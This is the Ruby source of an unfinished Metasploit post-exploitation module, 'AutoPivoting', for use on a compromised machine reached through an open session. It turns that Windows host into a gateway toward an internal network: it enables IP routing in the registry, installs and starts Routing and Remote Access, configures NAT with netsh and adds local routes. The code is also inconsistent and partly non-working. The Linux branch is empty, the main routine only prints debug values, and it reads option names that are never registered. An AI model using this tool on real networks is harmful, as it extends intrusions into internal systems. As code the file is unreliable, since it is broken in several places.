
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows'

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Powershell

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'AutoPivoting',
        'Description'   => %q{This module Configures the computer to be a gateway torward other network. It works with linux and windows systems.},
        'License'       => MSF_LICENSE,
        'Author'        => 
           [
             'Mikel & j4r3',
             'none <none[at]gmail.com>'
           ],
		'Platform'      => [ 'win', 'linux'],
        'SessionTypes'  => [ 'meterpreter','shell']
      ))

    register_options(
      [
		# OptBool.new( 'SYSTEMINFO', [ true, 'True if you want to get system info', 'TRUE' ])
		OptAddressRange.new('RNET',    [false, 'The network we want to arrive (Example: 10.0.0.0/24)']),
		OptAddress.new('RIFGW',    [false, 'IP address of nic of rhost that incomes our data (our side IP)']),
		OptString.new('NIFIN', [false, 'Name interface adapter on rhost that are connected in same lhost network. Explample: "eth0", "Ethernet 2"...']),
		OptString.new('NIFOUT', [false, 'Name interface adapter on rhost that are connected in to objetive network. Explample: "eth1", "Ethernet", "tap0"...']),
      ])
  end
  
	########################################################################################################
	####################################START_FUNCTIONS#####################################################
	########################################################################################################
	
	#
	# Get OS of kali redbox
	#
	def sistema_base?
		if (Msf::Config.local_directory[0,1])==("/")
			return "linux"
		elsif ((Msf::Config.local_directory[0,1])=~ /[[:alpha:]]/)
			return "windows"
		else
			#usamos uknown por el tipo de sistemas compatibles en el framwork
			return "unknown" 
		end
	end

	def linux_pivot()
		#
		# Linux commands
		#
		
	end
	
	#
	# Get the windows service status in string format
	#
	def getStatus(status)
		
		case status.to_s
		when '1'
			return 'Stoped'
		when '4'
			return 'Started'
		when '7'
			return 'Disabled'
		end
		return "Unknown status: #{status.to_s}"
	end
	
	#
	# Ask the user if want to continue with an action
	#
	def continue_execution(msg)
		print_status(msg.to_s)
		continue = "N"
		continue = gets.chomp
		continue = continue.gsub("\n","")
		while not ['y','Y','n','N'].include? continue
			print_status("Please, enter Y or N.")
			continue = gets.chomp
			continue = continue.gsub("\n","")
		end
		return continue
	end
	
	#
	# Return the SO in format "Windows <version>"
	#
	def getSO(str_os)
		version = "Unknown"
		if str_os =~ /Windows 2008/
			version = "Windows 2008"
		elsif str_os =~ /Windows 2012/
			version = "Windows 2012"
		elsif str_os =~ /Windows XP/
			version = "Windows XP"
		elsif str_os =~ /Windows 2003/
			version = "Windows 2003"
		elsif str_os =~ /Windows 7/
			version = "Windows 7"
		elsif str_os =~ /Windows 8/
			version = "Windows 8"
		elsif str_os =~ /Windows 10/
			version = "Windows 10"
		elsif str_os =~ /Windows Vista/
			version = "Windows Vista"
		elsif str_os =~ /Windows 2016/
			version = "Windows 2016"
		end
		return version
	end
	
	#
	# Return the pivot SO specified by the user
	#
	def chooseOS()
	
		version = ""
		while not ["1","2","3","4","5","6","7","8","9"].include? version
			print_status("Please, select a valid option (1,2,3,4,5,6,7,8 or 9)")
			puts("1) Windows XP")
			puts("2) Windows 2003")
			puts("3) Windows Vista")
			puts("4) Windows 7")
			puts("5) Windows 8")
			puts("6) Windows 10")
			puts("7) Windows 2008")
			puts("8) Windows 2012")
			puts("9) Windows 2016")
			version = gets.chomp
			version = version.gsub("\n","")
		end
		v = ""
		if version == "7"
			v = "Windows 2008"
		elsif version == "8"
			v = "Windows 2012"
		elsif version == "1"
			v = "Windows XP"
		elsif version == "2"
			v = "Windows 2003"
		elsif version == "4"
			v = "Windows 7"
		elsif version == "5"
			v = "Windows 8"
		elsif version == "6"
			v = "Windows 10"
		elsif version == "3"
			v = "Windows Vista"
		elsif version == "9"
			v = "Windows 2016"
		else
			v = "Windows"
		end
		
		return v
	
	end
	
	#
	# Windows commands
	#
	def windows_pivot()

		if is_admin? or is_system?
		
			rra_info = service_info("RemoteAccess")
			rra_status = getStatus(rra_info[:status])
			key = "HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\"
			iprouting_reg_status = registry_getvalinfo(key,"IPEnableRouter")["Data"]
			win_version = getSO(session.sys.config.sysinfo['OS'])
			continue = continue_execution("Operating System: #{win_version}. Is it correct? (Y/n)")
			if ["n","N"].include? continue
				win_version = chooseOS()
			end
			print_status("Starting the proccess...")			
			
			# Common to all windows versions
			print_status("Enabling IP Router...")
			
			if iprouting_reg_status != 1
				continue = continue_execution("The registry value of IPEnableRouter has to set to 1 in the pivot. Do you want to continue? (y/N)")
				if ["y","Y"].include? continue
					if registry_setvaldata(key, "IPEnableRouter", "1", "REG_DWORD")
						print_good("	IP Routing is Enabled.")
					else
						print_bad("  	There was an error setting the IPEnableRouter value.")
						# Exit.
						abort("Aborting module...")
					end
				else
					abort("Aborting module...")
				end
			else
				print_good("	IP Routing is Enabled. It's not necessary to change the value.")
			end
			
			if win_version=~ /Windows 2008/
				if have_powershell?
					rol_status = psh_exec("Import-Module ServerManager; Get-WindowsFeature | findstr 'NPAS-RRAS-Services' | findstr '[X'")
					if rol_status == ""
						continue = continue_execution("It's necessary install Routing and Remote Access rol in the pivot. Do you want to continue?(N/y)")
						if ['y','Y'].include? continue
							print_status("Powershell is installed in #{win_version['OS']}. Trying to install the Routing and Remote Access rol.")
							# Windows 2008
							psh_exec("Import-Module ServerManager; Add-WindowsFeature NPAS-RRAS-Services")
						else
							abort("Aborting module...")
						end
					else
						print_status("The necessary rols are installed. It's not necessary to install them")
					end
				else
					# Aunque hay muy pocas probabilidades de que entre aquí, hay que comprobar mediante linea de comando si está instalado o no
					print_status("Powershell is not installed in #{win_version['OS']}. Trying to install the Routing and Remote Access rol from command line...")
					cmd_exec("c:\Windows\system32\ServerManagerCmd.exe -install NPAS-RRAS-Services")
				end
			elsif win_version=~ /Windows 2012/
				if have_powershell?
					rol_status = psh_exec("Import-Module ServerManager; Get-WindowsFeature | findstr 'Routing' | findstr '[X'")
					if not rol_status.include? "Installed"
						continue = continue_execution("It's necessary install Routing and Remote Access rol in the pivot. Do you want to continue?(N/y)")
						if ['y','Y'].include? continue
							print_status("Powershell is installed in #{win_version}. Trying to install the services.")
							psh_exec("Import-Module ServerManager; Add-WindowsFeature Routing")
						else
							abort("Aborting module...")
						end
					else
						print_status("The services are installed. It's not necessary to install them")
					end
				else
					print_bad("Powershell is not installed in #{win_version}. For this windows version (#{win_version}) we can't continue the execution.")
					abort("Aborting module...")
				end
			elsif win_version=~ /Windows 8/ or  win_version['OS']=~ /Windows 7/ or  win_version['OS']=~ /Windows 10/
				print_bad("The system #{win_version} is not compatible with this module. The compatible systems are: Windows XP, Windows Server 2003, Windows Server 2008, windows Server 2012 and Windows Server 2016.")
				abort("Aborting module...")
			else
				print_bad("The system #{win_version} is not compatible with this module. The compatible systems are: Windows XP, Windows Server 2003, Windows Server 2008, windows Server 2012 and Windows Server 2016.")
				abort("Aborting module...")
			end
			
			# Common to all windows versions
			
			continue = continue_execution("It's necessary to configure NAT interfaces options in the pivot. Do you want to continue? (y/N)")
			if ["y","Y"].include? continue
				print_status("Configuring interfaces...")
				cmd_exec("netsh routing ip nat install")
				cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full")
				cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private")
			else
				abort("Aborting module...")
			end
			
			# Specific instructions for each windows version
			
			print_status("Enabling Routing and Remote Access service...")
			if rra_status == 'Started'
				print_good("The service is enabled. It's not necessary to start it.")
			else
				if win_version=~ /Windows 2012/
					cmd_exec ("sc config RemoteAccess start= auto")
					print_status("Starting Routing and Remote Access service...")
					cmd_exec("net start RemoteAccess")
					print_good("	RemoteAccess service started.")
				else
					if service_change_startup("RemoteAccess",2)
						print_good("	RemoteAccess service enabled.")
					else
						print_bad("  	There was an error enabling RemoteAccess service.")
						# Exit
						abort("Aborting module...")
					end
					print_status("Starting Routing and Remote Access service...")
					if service_start("RemoteAccess")
						print_good("	RemoteAccess service started.")
					else
						print_bad("  	There was an error starting RemoteAccess service.")
						# Exit
						abort("Aborting module...")
					end
				end			
				puts("")
			end
		else
			print_bad("You have to be administrator in the pivot machine to execute this module.")
			abort("Aborting module...")
		end
	end

	#
	# Get network
	#
	def get_net(eval_net)
		if eval_net.include? "/"
			if eval_net.split("/").length == 2
				return eval_net.split("/").first
			end
		end
		return false
	end
	
	#
	# Get CDIR
	#
	def get_cidr(eval_net)
		if eval_net.include? "/"
			if eval_net.split("/").length == 2
				return eval_net.split("/").last.to_i
			end
		end
		return false
	end

	#
	# cidr to netmask function
	#
	def get_netmask(eval_net)
		cidr= eval_net.split("/").last
		return IPAddr.new('255.255.255.255').mask(cidr).to_s
	end
	
	#
	# check the format of parameter NET
	#
	def check_rnet()
		if get_cidr(datastore['NET']) == false or not((0..33).include?(get_cidr(datastore['NET']))) or not(Rex::Socket.is_ipv4?(get_net(datastore['NET'])))
			print_bad("You need to provide IPv4 network in NET parameter. Example: 192.168.1.0/24")
			return false
		end
		return true
	end
	
	#
	# Create the route in local machine
	# 
	def create_route()
		print_status("Adding route to target network...")
		case sistema_base?
	  	when 'linux'
		  	if system("route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
				print_good("Route added.")
			else
				print_bad("Something was wrong adding local route. Try to add it manually.")
				print_bad("route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
			end
		when 'windows'
			if system("route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
				print_good("Route added.")
			else
				print_bad("Something was wrong adding local route. Try to add it manually")
				print_bad("route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
			end
		end
	end
	
	#
	# Get valid ifaces on objective and returns array of them
	#
	def valid_ifaces()#resultado array multidimensional [ipv4,nombre_int_fisica,netmask,nombre_interfaz]
		ifaces=[]
		index=0
		iface=client.net.config.interfaces
		count=0
		remote_os=session.sys.config.sysinfo['OS']
		iface.each do |i|
			i.addrs.length.times do |y|
				if not (i.mac_name =~ /Loopback/ or i.mac_name =~ /lo/ )
					if i.addrs[y] =~ /\b[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\b/
						count+=1

						if remote_os =~ /Linux/
							if_name=i.mac_name.gsub("\xA0","á").gsub("\xA2","ó").gsub("\xF3","ó")
							ifaces[index]=[i.addrs[y],i.netmasks[y],if_name,if_name]
							index+=1
						elsif remote_os=~ /Windows/
							ifaces[index]=[i.addrs[y],i.netmasks[y],i.mac_name.gsub("\xA0","á").gsub("\xA2","ó").gsub("\xF3","ó"),get_if_name(i.addrs[y])]#testar ultimo parametro
							index+=1
						else
							return nil
						end

					end
				end
			end
		end
		return ifaces
	end
	
	#
	# Get interfaces name on windows
	#
	def get_if_name(ip)#obtain ifname on windows platform
		system_ifaces = cmd_exec('ipconfig').gsub("\r","").split("\n")
		adapter_name=[]
		system_ifaces.each do |x|
			if x.include? "Ethernet"
				adapter_name=x.split(":").first
			elsif (x.include? " IP" and x.include? ":") and not(x.include? "IPv6")#obtain ipv4 only
				ip_iface = x.split(": ")
				if_ip = ip_iface.last
				if if_ip == ip
					return adapter_name.gsub("\xA0","á").gsub("\xA2","ó")
				end
			end
		end
		return nil
	end

	#
	# obtains all data to use in every command return hash{rif_in{ip,netmask,name_of_card,network},rif_out{ip,netmask,name_of_card,network},local_if{ip}}
	#

	def rhost_data() #return [if_in_ip,netmask_if_in,l_network,RifIN,if_out_ip,name_iface,r_network,RifOUT]

		rif_in={}
		rif_out={}
		local_if={}
		local_if[:ip]= session.tunnel_local.split(":").first #local ip of redbox
		rif_in[:ip] = session.tunnel_peer.split(":").first #ip of connected objective
		ifaces=valid_ifaces()#obtenemos el array para parsear las interfaces validas

				ifaces.each do |x|
					if rif_in[:ip] == x[0]
						rif_in[:netmask] = x[1]
						rif_in[:name] = x[3]
						rif_in[:network]=IPAddr.new(rif_in[:ip] + "/" + rif_in[:netmask]).to_s
					else 
						rif_out[:ip] = x[0]
						rif_out[:netmask] = x[1]
						rif_out[:name] = x[3]
						rif_out[:network]=IPAddr.new(rif_out[:ip] + "/" + rif_out[:netmask]).to_s
					end
				end
		final_hash={}
		final_hash[:rif_in]=rif_in
		final_hash[:rif_out]=rif_out
		final_hash[:local_if]=local_if
		return final_hash


	end 

	
	######################################################################################################
	####################################END_FUNCTIONS#####################################################
	######################################################################################################
	
	#
  	# MAIN PROGRAM
  	#
	def run
		total_ifaces=valid_ifaces().length
		if total_ifaces == 2
			print_good("Detected two valid interfaces. Begin of operations...")
		elsif total_ifaces == 1
			print_bad("Only one interface detected. No operations to do. ")#pendiente invocar error para detener ejecucion
		elsif total_ifaces > 2
			print_bad("Too many interfaces detected. Set it manually. ")#pendiente invocar error para detener ejecucion
		end

		if check_rnet() and total_ifaces == 2
			case session.platform
			when 'linux'
				print_status("comandos para linux")
				testar= rhost_data()#resultado en formato hash de la funcion que obtiene todos los datos del rhost
				print_good("final hash ip rif:#{testar[:rif_in][:ip]} ")
				print_good("final hash network rif:#{testar[:rif_in][:network]} ")
				print_good("final hash netmask rif:#{testar[:rif_in][:netmask]} ")
				print_good("final hash nombre nic rif:#{testar[:rif_in][:name]} ")
				print_good("final hash ip rifout:#{testar[:rif_out][:ip]} ")
				print_good("final hash network rifout:#{testar[:rif_out][:network]} ")
				print_good("final hash netmask rifout:#{testar[:rif_out][:netmask]} ")
				print_good("final hash nombre nic:#{testar[:rif_out][:name]} ")
			when 'windows'
				print_status("comandos para windows")
				testar= rhost_data()#resultado en formato hash de la funcion que obtiene todos los datos del rhost
				print_good("final hash ip rif:#{testar[:rif_in][:ip]} ")
				print_good("final hash network rif:#{testar[:rif_in][:network]} ")
				print_good("final hash netmask rif:#{testar[:rif_in][:netmask]} ")
				print_good("final hash nombre nic rif:#{testar[:rif_in][:name]} ")
				print_good("final hash ip rifout:#{testar[:rif_out][:ip]} ")
				print_good("final hash network rifout:#{testar[:rif_out][:network]} ")
				print_good("final hash netmask rifout:#{testar[:rif_out][:netmask]} ")
				print_good("final hash nombre nic:#{testar[:rif_out][:name]} ")
				
			end

		else
			print_bad("Aborting Module...")
		end
  	end
end
